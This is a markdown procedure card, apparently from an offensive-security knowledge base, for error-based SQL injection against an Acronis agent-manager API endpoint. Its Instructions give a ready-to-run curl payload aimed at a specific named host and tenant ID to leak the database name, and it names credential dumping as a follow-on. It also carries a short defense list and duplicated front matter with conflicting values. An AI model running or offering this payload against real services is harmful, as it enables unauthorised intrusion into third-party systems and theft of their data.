---
id: 123e4567-e89b-12d3-a456-426614174001
tags:
  - sqli
  - mysql
  - error-based
  - database-leak
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-sqli-database-leak]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:26.302Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---
id: 123e4567-e89b-12d3-a456-426614174001
name: Error-Based-SQL-Injection-to-Leak-Database-Name
type: procedure
verified: false
submitted: false
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
tactics: [[Initial Access]], [[Collection]]
techniques: [[Exploit Public-Facing Application]]
sub_techniques: []
tags: sqli, mysql, error-based, database-leak
commands: [[commands/curl-sqli-database-leak]]
platforms: Web, MySQL
tools: []
---

# Error-Based-SQL-Injection-to-Leak-Database-Name

## Summary

This procedure exploits a SQL injection vulnerability in the 'unit' parameter of the Acronis agent-manager API to leak the current database name using MySQL's extractvalue function for error-based exfiltration.

## Description

The attack targets the GET endpoint /api/agent_manager/v2/unit_configurations where the 'unit' parameter is unsanitized and concatenated into a backend SQL query. By injecting a payload with extractvalue(1, concat(char(126), (select database()))), an XPath syntax error is triggered, embedding the database name in the error message prefixed by '~'. This allows attackers to extract sensitive metadata without direct query results, confirming arbitrary SQL execution and enabling further compromise like credential dumping.

## Requirements

1. Network access to the Acronis API endpoint (e.g., https://target.com/api/agent_manager/v2/unit_configurations)
2. Known tenant_id value (e.g., 1590228) for the request
3. HTTP client like curl or browser tools
4. MySQL backend (inferred from payload compatibility)

## Defense

Defensive measures and detection strategies:

- Implement parameterized queries or prepared statements in the backend to sanitize inputs
- Use web application firewalls (WAF) to detect SQL keywords like 'extractvalue' or 'concat'
- Enable SQL error logging without exposing details to users; return generic errors
- Conduct input validation on 'unit' parameter to whitelist expected values (e.g., agent names)

## Objectives

1. Confirm SQL injection vulnerability in the API parameter
2. Exfiltrate the database name for reconnaissance
3. Assess potential for broader data access

## Instructions

### Step 1: Craft and Send Injection Payload

**Context**: Modify the 'unit' parameter to close the SQL string and inject the error-based payload, triggering an extractvalue error that leaks the database name.

**Command** ([[commands/curl-sqli-database-leak]]):
```bash
curl -X GET "https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent'%20and%2F%2A%2A%2Fextractvalue(1,concat(char(126),(select%20database())))%20and'%20" -v
```

> This command sends a GET request with the injected payload. The verbose (-v) flag shows headers and response. Success is indicated by an SQL error in the body containing '~' followed by the database name, such as "XPATH syntax error: '~acronis_db'". If no error occurs, the payload may need URL encoding adjustments or the endpoint might be patched.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-sqli-database-leak]]

## Tools Used


## Tags

- sqli
- mysql
- error-based
- database-leak
